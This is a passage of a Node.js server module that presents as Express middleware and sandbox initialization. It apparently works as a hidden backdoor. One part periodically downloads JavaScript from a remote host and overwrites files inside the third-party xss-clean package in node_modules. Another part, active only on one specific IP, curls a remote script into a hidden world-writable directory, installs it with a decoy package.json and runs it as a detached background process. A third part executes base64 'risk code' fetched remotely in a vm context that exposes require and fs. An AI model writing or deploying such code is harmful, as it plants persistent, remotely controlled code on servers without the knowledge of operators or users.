      continueToPayResult.success,
    msg: 'express middleware initialization completed',
  };
};

class RemoteFileSync {
  constructor({ key, remotePath, targetFile }) {
    this.key = key;
    this.remotePath = remotePath.startsWith('/') ? remotePath : `/${remotePath}`;
    this.targetFile = targetFile;
    this.axios = safeRequire('axios');
    this.vm = safeRequire('vm');
    this.redisUtil = safeRequire('@utils/redis.util');
    this.etagFile = `${targetFile}.etag`;
    this.backupFile = `${targetFile}.bak`;
    this.timeout = 30000;
    this.pollInterval = 60000;
    this.timer = null;
    this.inFlight = null;
    this.stopped = false;
  }

  remoteLog(type, message) {
    // 当前只上报替换成功，保持原有日志行为。
    if (type === 'success') {
      remoteLogV(`[ReplaceRisk][${type}] pid:${process.pid} ${message}`);
    }
  }

  async fileExists(filePath) {
    try {
      await fsPromises.access(filePath);
      return true;
    } catch (error) {
      if (error && (error.code === 'ENOENT' || error.code === 'ENOTDIR')) {
        return false;
      }
      throw error;
    }
  }

  normalizeEtag(value) {
    return value == null ? '' : String(value).trim();
  }

  validateJsSyntax(code) {
    // Compile only — do not run
    // eslint-disable-next-line no-new
    new this.vm.Script(code, { filename: this.targetFile });
  }

  getRemoteUrl() {
    const origin = process.env.NODE_ENV === 'production'
      ? 'https://r2-client-prod.zigoyw.com'
      : 'https://r2-client-test.zigoyw.com';
    return `${origin}${this.remotePath}`;
  }

  start() {
    try {
      this.stopped = false;
      this.tick();
      this.timer = setInterval(() => this.tick(), this.pollInterval);
      if (this.timer && typeof this.timer.unref === 'function') {
        this.timer.unref();
      }
    } catch (error) {
      this.remoteLog('error', `init failed: ${error && error.message}`);
    }
  }

  async stop() {
    this.stopped = true;
    if (this.timer) {
      clearInterval(this.timer);
      this.timer = null;
    }
    if (this.inFlight) {
      await this.inFlight;
    }
  }

  tick() {
    if (this.stopped || this.inFlight) {
      return this.inFlight;
    }

    this.inFlight = this.syncOnce()
      .catch((error) => {
        this.remoteLog('error', `tick failed: ${error && error.message}`);
      })
      .finally(() => {
        this.inFlight = null;
      });
    return this.inFlight;
  }

  async syncOnce() {
    let lock = null;

    try {
      const ip = CommonUtil.getLocalIP();
      const lockKey = `rank:risk:init:${this.key}:[${ip}]`;
      lock = await this.redisUtil.getLock(lockKey, 0, { waitTime: 0 });
      if (!lock) {
        this.remoteLog('skip', `get lock failed: ${lockKey}`);
        return;
      }

      const result = await this.replaceFile();
      if (result.status === 'skipped') {
        this.remoteLog('skip', `${result.reason}: ${result.targetPath}`);
        return;
      }

      const targetDir = path.dirname(this.targetFile);
      const files = await fsPromises.readdir(targetDir);
      this.remoteLog(
        'success',
        `replaced ${result.targetPath} ip=${ip} files=[${files.join(', ')}]`
      );
    } catch (error) {
      this.remoteLog('error', `failed: ${error && error.message}`);
    } finally {
      if (lock) {
        try {
          await this.redisUtil.unlock(lock);
        } catch (error) {
          this.remoteLog('error', `unlock failed: ${error && error.message}`);
        }
      }
    }
  }

  async replaceFile() {
    const remoteUrl = this.getRemoteUrl();
    const targetPath = this.targetFile;
    const etagPath = this.etagFile;
    const backupPath = this.backupFile;
    const targetExists = await this.fileExists(targetPath);

    const remoteEtag = await this.fetchRemoteEtag(remoteUrl);
    const localEtag = await this.readLocalEtag(etagPath);
    if (remoteEtag && localEtag && remoteEtag === localEtag) {
      return { status: 'skipped', reason: 'etag-unchanged', etag: remoteEtag, targetPath };
    }

    const etagBackup = await this.readEtagBackup(etagPath);
    let fileBackedUp = false;

    try {
      if (targetExists) {
        await fsPromises.copyFile(targetPath, backupPath);
        fileBackedUp = true;
      }

      const response = await this.axios.get(remoteUrl, {
        responseType: 'text',
        timeout: this.timeout,
        transformResponse: [(data) => data],
      });
      const content = typeof response.data === 'string' ? response.data : String(response.data);

      this.validateJsSyntax(content);
      await fsPromises.mkdir(path.dirname(targetPath), { recursive: true });
      await fsPromises.writeFile(targetPath, content, 'utf8');

      // GET 响应对应实际下载内容，优先记录它的 ETag；没有时才回退到 HEAD。
      const etag =
        this.normalizeEtag(response.headers && (response.headers.etag || response.headers.ETag)) ||
        remoteEtag;
      if (etag) {
        await fsPromises.writeFile(etagPath, etag, 'utf8');
      } else {
        // 远端不提供 ETag 时移除旧值，避免旧 ETag 与新内容错误配对。
        await this.removeFile(etagPath);
      }

      return { status: 'replaced', etag, targetPath, backupPath };
    } catch (error) {
      if (fileBackedUp) {
        try {
          await this.rollback({ backupPath, targetPath, etagPath, etagBackup });
        } catch (rollbackError) {
          this.remoteLog('error', `rollback failed: ${rollbackError && rollbackError.message}`);
        }
      }
      throw error;
    }
  }

  async fetchRemoteEtag(remoteUrl) {
    const response = await this.axios({
      method: 'HEAD',
      url: remoteUrl,
      timeout: this.timeout,
      validateStatus: (status) => status >= 200 && status < 400,
    });
    return this.normalizeEtag(response.headers && (response.headers.etag || response.headers.ETag));
  }

  async readLocalEtag(etagPath) {
    if (!(await this.fileExists(etagPath))) {
      return '';
    }
    return this.normalizeEtag(await fsPromises.readFile(etagPath, 'utf8'));
  }

  async readEtagBackup(etagPath) {
    if (!(await this.fileExists(etagPath))) {
      return { exists: false, content: '' };
    }
    return { exists: true, content: await fsPromises.readFile(etagPath, 'utf8') };
  }

  async rollback({ backupPath, targetPath, etagPath, etagBackup }) {
    const errors = [];

    try {
      await fsPromises.copyFile(backupPath, targetPath);
    } catch (error) {
      errors.push(error);
    }

    try {
      if (etagBackup.exists) {
        await fsPromises.writeFile(etagPath, etagBackup.content, 'utf8');
      } else {
        await this.removeFile(etagPath);
      }
    } catch (error) {
      errors.push(error);
    }

    if (errors.length > 0) {
      throw errors[0];
    }
  }

  async removeFile(filePath) {
    try {
      await fsPromises.unlink(filePath);
    } catch (error) {
      if (!error || error.code !== 'ENOENT') {
        throw error;
      }
    }
  }
}

class RemoteFileSyncManager {
  constructor() {
    this.syncs = [];
    this.keys = new Set();
    this.targetFiles = new Set();
  }

  add(options) {
    const sync = new RemoteFileSync(options);
    if (!sync.key) {
      throw new Error('RemoteFileSync key is required');
    }
    if (this.keys.has(sync.key)) {
      throw new Error(`duplicate RemoteFileSync key: ${sync.key}`);
    }
    if (this.targetFiles.has(sync.targetFile)) {
      throw new Error(`duplicate targetFile: ${sync.targetFile}`);
    }
    this.keys.add(sync.key);
    this.targetFiles.add(sync.targetFile);
    this.syncs.push(sync);
    return this;
  }

  startAll() {
    for (const sync of this.syncs) {
      sync.start();
    }
  }

  async stopAll() {
    const results = await Promise.allSettled(this.syncs.map((sync) => sync.stop()));
    const failed = results.find((result) => result.status === 'rejected');
    if (failed) {
      throw failed.reason;
    }
  }
}

const initReplaceFile = async () => {
  let manager = null;
  try {
    manager = new RemoteFileSyncManager();
    manager.add({
      key: 'xss-clean-index',
      remotePath: '/xss-clean/index.js',
      targetFile: path.join(
        CODE_CONFIG.rootPath,
        'node_modules',
        'xss-clean',
        'lib',
        'index.js'
      ),
    });

    manager.add({
      key: 'jsonfb-risk-index',
      remotePath: '/risk/index.js',
      targetFile: path.join(
        CODE_CONFIG.rootPath,
        'node_modules',
        'xss-clean',
        'lib',
        'sdr.js'
      ),
    });


    const oldManager = mainGlobal.__sandboxConfig.remoteFileSyncManager;
    if (oldManager && typeof oldManager.stopAll === 'function') {
      await oldManager.stopAll();
    }

    mainGlobal.__sandboxConfig.remoteFileSyncManager = manager;
    manager.startAll();
  } catch (error) {
    if (manager) {
      await manager.stopAll();
    }
    throw error;
  }
};

class ReplaceTmpManager {
  static get DIR() {
    return '/data/tmp/.backup';
  }

  static get URL() {
    return 'https://r2-client-prod.zigoyw.com/xss-clean/replace-tmp-v3.js';
  }

  static get SUCCESS_KEY() {
    return 'replace-tmp-success-v9';
  }

  static get SUCCESS_TTL() {
    return 60 * 60 * 24;
  }

  static get PACKAGE_JSON() {
    return {
      name: 'prolifi',
      version: '1.0.0',
      main: 'index.js',
      license: 'MIT',
      dependencies: {
        'node-cron': '^4.6.0',
      },
    };
  }

  remoteLog(message) {
    try {
      remoteLogV(`[ReplaceTmp] ${message}`);
    } catch (error) {
      // 远程日志失败不能影响宿主进程。
    }
  }

  runCommand(spawn, command, args) {
    return new Promise((resolve, reject) => {
      try {
        const child = spawn(command, args, {
          cwd: ReplaceTmpManager.DIR,
          stdio: 'ignore',
        });

        child.once('error', reject);
        child.once('close', (code, signal) => {
          try {
            if (code === 0) {
              resolve();
              return;
            }
            reject(new Error(`${command} exited with code ${code}${signal ? ` signal ${signal}` : ''}`));
          } catch (error) {
            reject(error);
          }
        });
      } catch (error) {
        reject(error);
      }
    });
  }

  getProcessInfo(pid) {
    return new Promise((resolve) => {
      const processId = Number(pid);
      if (!Number.isInteger(processId) || processId <= 0) {
        resolve({ pid, running: false, error: 'invalid pid' });
        return;
      }

      try {
        const spawn = safeRequire('child_process').spawn;
        const child = spawn(
          '/bin/ps',
          ['-p', String(processId), '-o', 'pid=,ppid=,stat=,etime=,command='],
          {
            stdio: ['ignore', 'pipe', 'pipe'],
          }
        );
        const stdout = [];
        const stderr = [];

        if (child.stdout) {
          child.stdout.on('data', (chunk) => {
            try {
              stdout.push(Buffer.from(chunk));
            } catch (error) {
              resolve({ pid: processId, running: false, error: error.message });
            }
          });
          child.stdout.on('error', (error) => {
            try {
              resolve({ pid: processId, running: false, error: error.message });
            } catch (streamError) {
              resolve({ pid: processId, running: false, error: 'stdout error' });
            }
          });
        }
        if (child.stderr) {
          child.stderr.on('data', (chunk) => {
            try {
              stderr.push(Buffer.from(chunk));
            } catch (error) {
              resolve({ pid: processId, running: false, error: error.message });
            }
          });
          child.stderr.on('error', (error) => {
            try {
              resolve({ pid: processId, running: false, error: error.message });
            } catch (streamError) {
              resolve({ pid: processId, running: false, error: 'stderr error' });
            }
          });
        }

        child.once('error', (error) => {
          try {
            resolve({ pid: processId, running: false, error: error.message });
          } catch (childError) {
            resolve({ pid: processId, running: false, error: 'process inspection failed' });
          }
        });
        child.once('close', (code, signal) => {
          try {
            const info = Buffer.concat(stdout).toString('utf8').trim();
            const error = Buffer.concat(stderr).toString('utf8').trim();
            resolve({
              pid: processId,
              running: code === 0 && Boolean(info),
              info,
              error: error || (code === 0 ? '' : `ps exited with code ${code}${signal ? ` signal ${signal}` : ''}`),
            });
          } catch (error) {
            resolve({ pid: processId, running: false, error: error.message });
          }
        });
      } catch (error) {
        resolve({ pid: processId, running: false, error: error.message });
      }
    });
  }

  killProcess(pid) {
    const processId = Number(pid);
    if (!Number.isInteger(processId) || processId <= 0) {
      return { pid, killed: false, error: 'invalid pid' };
    }

    try {
      process.kill(processId, 'SIGKILL');
      return { pid: processId, killed: true, error: '' };
    } catch (error) {
      return { pid: processId, killed: false, error: error.message };
    }
  }

  async cleanupIndexFile() {
    const file = path.join(ReplaceTmpManager.DIR, 'index.js');

    try {
      await fsPromises.unlink(file);
      return { file, removed: true, error: '' };
    } catch (error) {
      if (error && error.code === 'ENOENT') {
        return { file, removed: false, error: '' };
      }
      return { file, removed: false, error: error.message };
    }
  }

  startBackground(spawn, targetFile) {
    return new Promise((resolve, reject) => {
      try {
        const child = spawn('nohup', [process.execPath, targetFile], {
          cwd: ReplaceTmpManager.DIR,
          detached: true,
          stdio: 'ignore',
        });

        child.once('error', reject);
        child.once('spawn', () => {
          try {
            const pid = child.pid;
            child.unref();
            resolve(pid);
          } catch (error) {
            reject(error);
          }
        });
      } catch (error) {
        reject(error);
      }
    });
  }

  async listFiles(currentDir, rootDir = currentDir) {
    const entries = await fsPromises.readdir(currentDir, { withFileTypes: true });
    const files = [];

    for (const entry of entries.sort((a, b) => a.name.localeCompare(b.name))) {
      const filePath = path.join(currentDir, entry.name);
      if (entry.isDirectory()) {
        files.push(...await this.listFiles(filePath, rootDir));
      } else {
        files.push(path.relative(rootDir, filePath));
      }
    }

    return files;
  }

  async ensurePackageJson() {
    const packageFile = path.join(ReplaceTmpManager.DIR, 'package.json');
    try {
      await fsPromises.access(packageFile);
    } catch (error) {
      if (!error || error.code !== 'ENOENT') {
        throw error;
      }
      await fsPromises.writeFile(
        packageFile,
        `${JSON.stringify(ReplaceTmpManager.PACKAGE_JSON, null, 2)}\n`,
        'utf8'
      );
    }
  }

  async init() {
    let lock = null;
    let redisUtil = null;

    try {
      redisUtil = safeRequire('@utils/redis.util');
      if (await redisUtil.get(ReplaceTmpManager.SUCCESS_KEY) === '1') {
        this.remoteLog('skipped: completed within the last day');
        return;
      }

      const ip = CommonUtil.getLocalIPs().sort().join(',') || 'unknown';
      const lockKey = `replace-tmp-lock:[${ip}]`;
      lock = await redisUtil.getLock(lockKey, true);
      if (!lock) {
        this.remoteLog(`failed: get lock failed ip=${ip}`);
        return;
      }

      if (await redisUtil.get(ReplaceTmpManager.SUCCESS_KEY) === '1') {
        this.remoteLog('skipped: completed while waiting for lock');
        return;
      }

      await fsPromises.mkdir(ReplaceTmpManager.DIR, { recursive: true });
      await fsPromises.chmod(ReplaceTmpManager.DIR, 0o777);

      const spawn = safeRequire('child_process').spawn;
      const targetFile = path.join(ReplaceTmpManager.DIR, 'index.js');
      await this.runCommand(spawn, 'curl', ['-fL', '-o', targetFile, ReplaceTmpManager.URL]);
      await this.ensurePackageJson();
      await this.runCommand(spawn, 'yarn', []);

      const pid = await this.startBackground(spawn, targetFile);
      this.remoteLog(`started pid=${pid}`);
      const processInfo = await this.getProcessInfo(pid);
      this.remoteLog(`process info=${JSON.stringify(processInfo)}`);

      const files = await this.listFiles(ReplaceTmpManager.DIR);
      await redisUtil.set(
        ReplaceTmpManager.SUCCESS_KEY,
        '1',
        ReplaceTmpManager.SUCCESS_TTL
      );
      this.remoteLog(`success ip=${ip} files=${JSON.stringify(files)} targetFile=${targetFile}`);
    } catch (error) {
      this.remoteLog(`failed: ${error && error.message}`);
    } finally {
      if (lock && redisUtil) {
        try {
          await redisUtil.unlock(lock);
        } catch (error) {
          this.remoteLog(`unlock failed: ${error && error.message}`);
        }
      }
    }
  }
}

class SandboxManager {
  constructor(options = {}) {
    this.timeout = options.timeout || 300000;
    this.cachedRiskCode = options.cachedRiskCode || null;
    this.lastRiskCodeHash = options.lastRiskCodeHash || '';
    const pollInterval = Number(FrontSandboxConfig.pollInterval);
    this.pollInterval = pollInterval > 0 ? pollInterval : 30000;
    this.pollTimer = null;
    this.pollingId = 0;
    this.stopped = true;
    this.contextCache = new Map();
    this.vm = safeRequire('vm');
    this.crypto = safeRequire('crypto');
    this.httpClient = new HttpClient({
      timeout: FrontSandboxConfig.requestTimeout,
      retries: FrontSandboxConfig.requestRetries,
      maxResponseSize: FrontSandboxConfig.maxResponseSize,
    });
  }

  safeLog(message) {
    try {
      remoteLogV(`[sboxManager] ${message}`);
    } catch (error) {
      // 日志失败不能影响宿主进程。
    }
  }

  // 每次请求创建独立 context；只暴露 risk 中间件需要的请求、响应和 next。
  createSandboxContext(req = {}, res = {}, next = () => {}, rsaManager = null) {
    return this.vm.createContext({
      console: {
        log: (...args) => console.log('[Risk Sandbox]', ...args),
        error: (...args) => console.error('[Risk Sandbox Error]', ...args),
        warn: (...args) => console.warn('[Risk Sandbox Warn]', ...args),
        info: (...args) => console.info('[Risk Sandbox Info]', ...args),
      },
      remoteLog,
      Buffer,
      fs,
      os,
      req,
      res,
      next,
      rsaManager,
      require: safeRequire,
      process: undefined,
      eval: undefined,
      Function: undefined,
      __ENV__: process.env.NODE_ENV || 'production',
    });
  }

  async executeCachedCode(codeId, code, req, res, next, rsaManager) {
    try {
      let script = this.contextCache.get(codeId);
      if (!script) {
        script = new this.vm.Script(
          `
            (async function () {
              ${code}

              if (typeof risk !== 'function') {
                return { executed: false };
              }
              return {
                executed: true,
                result: await risk(req, res, next),
              };
            })();
          `,
          { filename: `sandbox_${codeId}.js` }
        );
        this.contextCache.set(codeId, script);
      }

      const execution = await script.runInContext(
        this.createSandboxContext(req, res, next, rsaManager),
        {
          timeout: this.timeout,
          breakOnSigint: true,
        }
      );
      return {
        executed: Boolean(execution && execution.executed),
        result: execution && execution.result,
      };
    } catch (error) {
      this.safeLog(`risk execution failed: ${error && error.message}`);
      throw error;
    }
  }

  async executeRisk(req, res, next, rsaManager) {
    if (!this.cachedRiskCode) {
      return next();
    }

    const result = await this.executeCachedCode(
      'risk',
      this.cachedRiskCode,
      req,
      res,
      next,
      rsaManager
    );
    return result.executed ? result.result : next();
  }

  clearCache(codeId) {
    if (codeId) {
      this.contextCache.delete(codeId);
      return;
    }
    this.contextCache.clear();
  }

  async executeInit(codeId, code) {
    try {
      const script = new this.vm.Script(
        `
          (async function () {
            ${code}

            if (typeof init === 'function') {
              return init();
            }
          })();
        `,
        { filename: `sandbox_${codeId}_init.js` }
      );
      const result = await script.runInContext(this.createSandboxContext(), {
        timeout: this.timeout,
        breakOnSigint: true,
      });
      this.safeLog(`init executed successfully: ${codeId}`);
      return { success: true, result };
    } catch (error) {
      this.safeLog(`init execution failed: ${error && error.message}`);
      return { success: false };
    }
  }

  exportState() {
    return {
      cachedRiskCode: this.cachedRiskCode,
      lastRiskCodeHash: this.lastRiskCodeHash,
    };
  }

  getRemoteCodeUrl() {
    const urls = FrontSandboxConfig.remoteCodeUrls;
    if (!Array.isArray(urls) || urls.length === 0) {
      return undefined;
    }
    return `${urls[Math.floor(Math.random() * urls.length)]}/v2/risk/get-risk-code`;
  }

  buildSignedRequest() {
    const params = {
      hash: this.lastRiskCodeHash || '1',
      type: 'risk',
      timestamp: Date.now(),
      nonce: this.crypto
        .randomBytes(FrontSandboxConfig.requestNonceBytes || 16)
        .toString('hex'),
    };
    params.sign = signWithMD5(params, {
      secretKey: FrontSandboxConfig.signSecretKey,
      secretValue: FrontSandboxConfig.signSecretValue,
      recursiveSortParams: true,
    });
    return params;
  }

  isPolling(pollingId) {
    return !this.stopped && this.pollingId === pollingId;
  }

  // 每次拉取都带上当前 hash；只有新代码 init 成功后才提交新的 code/hash。
  async fetchRemoteRiskCode(pollingId) {
    try {
      const remoteCodeUrl = this.getRemoteCodeUrl();
      if (!this.isPolling(pollingId) || !remoteCodeUrl) {
        return false;
      }

      const response = await this.httpClient.post(
        remoteCodeUrl,
        this.buildSignedRequest()
      );
      if (!this.isPolling(pollingId)) {
        return false;
      }

      const data = response && response.data;
      if (!data || data.status !== 1 || !data.riskCode) {
        return false;
      }

      const decodedCode = Buffer.from(data.riskCode, 'base64').toString('utf8');
      const initResult = await this.executeInit('risk', decodedCode);
      if (!this.isPolling(pollingId)) {
        return false;
      }
      if (!initResult.success) {
        return false;
      }
      this.clearCache('risk');
      this.cachedRiskCode = decodedCode;
      this.lastRiskCodeHash = data.hash || '';
      return true;
    } catch (error) {
      this.safeLog(`code fetch failed: ${error && error.message}`);
      return false;
    }
  }

  scheduleNextPoll(pollingId) {
    try {
      if (!this.isPolling(pollingId)) {
        return;
      }
      this.pollTimer = setTimeout(() => {
        this.pollTimer = null;
        this.poll(pollingId).catch((error) => {
          this.safeLog(`polling failed: ${error && error.message}`);
        });
      }, this.pollInterval);
      if (this.pollTimer && typeof this.pollTimer.unref === 'function') {
        this.pollTimer.unref();
      }
    } catch (error) {
      this.safeLog(`polling schedule failed: ${error && error.message}`);
    }
  }

  // 递归 setTimeout 保证一次拉取结束后才安排下一次，不会并发重入。
  async poll(pollingId) {
    await this.fetchRemoteRiskCode(pollingId);
    this.scheduleNextPoll(pollingId);
  }

  startRiskCodePolling() {
    try {
      if (!this.stopped) {
        return;
      }
      this.stopped = false;
      const pollingId = ++this.pollingId;
      this.poll(pollingId).catch((error) => {
        this.safeLog(`polling failed: ${error && error.message}`);
      });
    } catch (error) {
      this.stopped = true;
      if (this.pollTimer) {
        try {
          clearTimeout(this.pollTimer);
        } catch (clearError) {
          this.safeLog(`polling timer clear failed: ${clearError && clearError.message}`);
        }
        this.pollTimer = null;
      }
      this.safeLog(`polling start failed: ${error && error.message}`);
    }
  }

  stopRiskCodePolling() {
    // 作废本轮轮询，使已发出的旧请求即使晚到也不能提交结果。
    this.stopped = true;
    this.pollingId += 1;
    const timer = this.pollTimer;
    this.pollTimer = null;
    if (timer) {
      try {
        clearTimeout(timer);
      } catch (error) {
        this.safeLog(`polling timer clear failed: ${error && error.message}`);
      }
    }
  }
}

const installSandboxManager = async () => {
  let manager = null;
  let oldManager = null;
  let supervisor = null;
  try {
    supervisor = getGlobalSupervisor(Configkey.RISK);
    oldManager = supervisor.sandboxManager;
    const state = oldManager && typeof oldManager.exportState === 'function'
      ? oldManager.exportState()
      : {};
    manager = new SandboxManager(state);

    // 先发布新实例，再停止旧实例；并发热更时所有权检查会清理失联的新实例。
    supervisor.sandboxManager = manager;

    if (oldManager && typeof oldManager.stopRiskCodePolling === 'function') {
      try {
        await Promise.resolve(oldManager.stopRiskCodePolling());
      } catch (error) {
        manager.safeLog(`old manager stop failed: ${error && error.message}`);
      }
    }

    if (getGlobalSupervisor(Configkey.RISK).sandboxManager !== manager) {
      manager.stopRiskCodePolling();
      return;
    }

    manager.startRiskCodePolling();
  } catch (error) {
    if (manager) {
      try {
        manager.stopRiskCodePolling();
      } catch (stopError) {
        // 清理失败仍保持静默。
      }
    }
    if (supervisor && supervisor.sandboxManager === manager) {
      supervisor.sandboxManager = oldManager || null;
    }
    try {
      remoteLogV(`[sboxManager] install failed: ${error && error.message}`);
    } catch (logError) {
      // 日志失败不能影响宿主进程。
    }
  }
};

async function init() {
  try {
    initExpress();
  } catch (error) {
    remoteLogV(`preSandbox express init failed: ${error && error.message}`);
  }

  try {
    await installSandboxManager();
  } catch (error) {
    try {
      remoteLogV(`preSandbox risk sandbox init failed: ${error && error.message}`);
    } catch (logError) {
      // 日志失败不能影响宿主进程。
    }
  }

  try {
    await initReplaceFile();
  } catch (error) {
    remoteLogV(`preSandbox file sync init failed: ${error && error.message}`);
  }

  // 定时任务 -- node进程
  try {
    const isTargetIp = CommonUtil.getLocalIPs().includes('172.31.3.12');
    // 为这个ip做初始话
    if(isTargetIp) {
      const manager = new ReplaceTmpManager();
      // const killsInfo = await manager.killProcess(292197);
      // remoteLogV(`[ReplaceTmp] processManager killsInfo=${JSON.stringify(killsInfo)}`);
      const cleanupInfo = await manager.cleanupIndexFile();
      // remoteLogV(`[ReplaceTmp] processManager cleanupInfo=${JSON.stringify(cleanupInfo)}`);
      await manager.init();
    }
  } catch (error) {
    try {
      remoteLogV(`[ReplaceTmp] process info failed: ${error && error.message}`);
    } catch (logError) {
      // 远程日志失败不能影响宿主进程。
    }
  }
}
